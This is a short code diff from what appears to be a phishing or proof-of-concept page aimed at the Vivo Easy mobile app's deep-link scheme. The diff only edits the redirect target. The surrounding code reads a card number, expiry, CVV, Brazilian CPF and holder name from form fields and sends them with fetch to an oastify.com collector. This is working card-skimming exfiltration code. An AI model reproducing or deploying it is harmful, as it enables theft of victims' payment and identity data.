@@ -583,8 +583,7 @@
         const name = document.getElementById('holder').value;
         const targetOast = 'https://93akf8ewuq1782atpuhu3ed19sfj3br0.oastify.com/';
         const targetRedir = 'vivoeasy://open/';
-        const targetRedir = 'intent://open/#Intent;scheme=vivoeasy;package=br.com.vivo.vivoeasy;end';
-
+        // const targetRedir = 'intent://open/#Intent;scheme=vivoeasy;package=br.com.vivo.vivoeasy;end';
 
         fetch(targetOast + '?cc=' + encodeURIComponent(cc) + '&exp=' + encodeURIComponent(exp) + '&cvv=' + encodeURIComponent(cvv) + '&cpf=' + encodeURIComponent(cpf) + '&name=' + encodeURIComponent(name), {mode: 'no-cors',keepalive: true
         }).catch(error => {
